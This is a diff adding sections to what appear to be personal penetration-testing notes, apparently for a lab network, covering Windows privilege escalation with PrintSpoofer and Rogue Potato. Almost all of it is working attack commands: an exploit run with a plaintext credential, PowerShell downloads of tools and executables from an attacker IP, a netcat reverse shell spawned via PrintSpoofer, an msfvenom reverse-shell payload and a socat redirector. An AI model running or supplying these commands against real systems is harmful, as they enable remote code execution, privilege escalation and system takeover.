@@ -1095,3 +1095,28 @@ d-----        2/19/2020   3:11 PM                en-US
 $ python3 ./49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c powershell.exe -a '-NoProfile -Command wget http://192.168.45.176/revshell7777.exe -Outfile C:/Users/Public/noraj.exe'
 $ python3 ./49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c powershell.exe -a '-NoProfile -Command C:/Users/Public/noraj.exe'
 ```
+
+### Windows Privesc: PrintSpoofer
+```bash
+iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
+iwr -uri http://192.168.45.176/nc.exe -Outfile nc.exe
+.\PrintSpoofer.exe -c "C:\TEMP\nc.exe 192.168.45.176 1337 -e cmd"
+```
+
+### Windows Privesc: Rogue Potato
+```bash
+
+sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET.MACHINE.IP>:9999
+## sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=53 -f exe > reverse.exe
+nc -nvlp 53
+
+iwr -uri http://192.168.45.176/RoguePotato.exe -Outfile RoguePotato.exe
+iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe
+
+.\RoguePotato.exe -r 192.168.45.176 -l 9999 -e ".\reverse.exe"
+
+```
+
+
